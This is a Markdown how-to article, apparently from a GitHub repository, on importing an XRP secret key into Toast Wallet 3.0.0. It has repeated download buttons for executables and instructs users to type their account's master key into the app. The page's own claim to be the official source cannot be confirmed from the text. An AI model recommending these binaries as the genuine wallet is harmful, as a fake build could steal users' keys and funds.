<p align="center"><img src="https://github.com/Toast-Wallet/learn/raw/HEAD/assets/banner-article.png" alt="Toast Wallet banner" width="100%"></p>

<h1 align="center">Import an XRP secret key into Toast Wallet</h1>

<p align="center">Add an existing account with its secret key starting with s.</p>

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

All versions and checksums are on the [Toast Wallet 3.0.0 release page](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> [!IMPORTANT]
> Only download from this GitHub release page.

---

## 💡 Short answer

In the [latest Toast Wallet](https://github.com/Toast-Wallet/core/releases/tag/3.0.0), choose **+ → Import an existing account**, type the XRP secret key that starts with `s`, confirm with your passphrase and check that the address matches. Then make a new backup code so the imported account is included.

## 👀 You'll see this if

- You have an XRP secret key (sometimes called a family seed) written down.
- An account is missing from your Toast backup, but you saved its secret key.
- You converted a 12 or 24 word phrase into a secret key offline and now need to use it.
- You want all your XRP accounts in one desktop wallet.

## 🤔 Why it matters

An XRP secret key is the master key for one XRP Ledger account. It usually begins with the letter `s` and is about 29 characters long. Whoever holds it controls the account. Toast Wallet can import this key directly, which makes it the bridge between other ways of storing XRP and the desktop wallet.

Importing is also where many mistakes happen: people type the key into the wrong field, confuse it with an address that begins with `r`, or forget to back up afterwards. Following a careful routine avoids all three.

## 🧭 Before you start

Make sure Toast Wallet is installed from the official release and that your own wallet is already set up with a PIN, passphrase and backup. Disconnect from screen sharing and close chat apps. Have the secret key on paper and, ideally, the public address of that account so you can compare.

## 🛠️ Fix: import step by step

1. **Open and unlock Toast Wallet.**
2. **Select the + button.** Choose **Import an existing account**.
3. **Type the secret key.** Enter the key starting with `s`, exactly as written. Typing by hand is safer than pasting from a file or a message.
4. **Confirm with your passphrase** if asked.
5. **Check the address.** Toast Wallet shows the address that belongs to the key. It starts with `r`. Compare it with your records. If it does not match, the key was mistyped.
6. **Wait for the balance.** The balance loads from the XRP Ledger.
7. **Make a new backup code.** Settings, Backup Wallet. Without this, the imported account is not in your backup. Steps are in [create a new Toast Wallet backup](https://github.com/Toast-Wallet/learn/blob/main/how-to/create-new-toast-wallet-backup.md).
8. **Store the secret key paper safely or destroy it securely** once the new backup is tested, depending on your preference. Never keep it in digital form.

## 🧩 Real-world example

A user once stored a secret key from an XRP paper wallet in a fireproof box. They install Toast Wallet, set it up and choose **+ → Import an existing account**. After typing the key, Toast shows an address that matches the one printed on their paper wallet, and the balance appears. They immediately make a new backup code, so the paper wallet's account now travels inside their regular Toast backup.

## ⚠️ Common mistakes

- Pasting an address (starting with `r`) where the secret key is expected.
- Confusing similar characters in the key, which produces a different address.
- Importing on a computer with remote-access software running.
- Forgetting to make a new backup after the import.

## 🔁 If that did not work

- **"Invalid secret".** Check each character. Secret keys are case-sensitive and do not include some easily confused characters.
- **The address is different from what you expected.** You either mistyped the key or have the key of another account. Do not send XRP to the new address until you are sure.
- **You have words, not a key.** Convert them offline first, as described in [Toast Wallet seed phrase to secret key offline](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-seed-phrase-to-secret-key-offline.md).
- **You are unsure what kind of key you have.** Read [Toast Wallet private key and family seed](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-private-key-family-seed.md).
- **The balance shows zero.** The account may be unactivated; see [Toast Wallet balance shows zero](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-balance-shows-zero.md).

## 🛡️ Prevention

Keep secret keys on paper only. Import them only into the desktop app, never into a website or browser extension. After any import, back up and label the new backup with the accounts it contains.

## 🔍 A closer look at checking the address

The address check after importing is the most important moment in the process. An XRP secret key always produces the same address. If you typed one character wrong, Toast Wallet will still accept a valid-looking key in some cases, but it will show a completely different address. That address belongs to nobody you know and holds nothing.

So always know which address you expect before you import. Compare at least the first six and last six characters. If they match, the import is correct. If they do not, delete that account from your notes, re-check the key on paper and try again. Never send XRP to an address that appeared from a mistyped key, because nobody, including you, could reliably access it later.

## 🧠 Remember

The import screen is the only place in Toast Wallet where a secret key belongs. Type it there, check the address, make a new backup and put the paper away. If you ever find yourself typing an `s` key anywhere else, stop and ask why, because that is exactly what scammers try to arrange.

## ❓ FAQ

<details>
<summary>Is a secret key the same as a seed phrase?</summary>

No. A seed phrase is a list of words. An XRP secret key is a single code starting with `s`.

</details>

<details>
<summary>Can I import the same key in two wallets?</summary>

Technically yes, but keeping each account in one place is easier to manage and safer.

</details>

<details>
<summary>Will importing move my XRP?</summary>

No. It gives Toast Wallet access to the account where the XRP already is.

</details>

> [!WARNING]
> Never type a secret key into a website or send it to anyone. Anyone who has it controls the account.

---

## ⬇️ Download Toast Wallet 3.0.0

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

Checksums for every file are on the [official Toast Wallet 3.0.0 release](https://github.com/Toast-Wallet/core/releases/tag/3.0.0). More guides live in the [Toast Wallet learn hub](https://github.com/Toast-Wallet/learn).

---

## 📚 Related articles

| Guide | What it covers |
|:--|:--|
| [Toast Wallet private key and family seed](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-private-key-family-seed.md) | The difference between secret key, family seed and private key. |
| [Toast Wallet seed phrase to secret key offline](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-seed-phrase-to-secret-key-offline.md) | Turn 12 or 24 words into an XRP secret key with the internet off. |
| [Create a new Toast Wallet backup](https://github.com/Toast-Wallet/learn/blob/main/how-to/create-new-toast-wallet-backup.md) | Make a fresh backup code after any change to your accounts. |
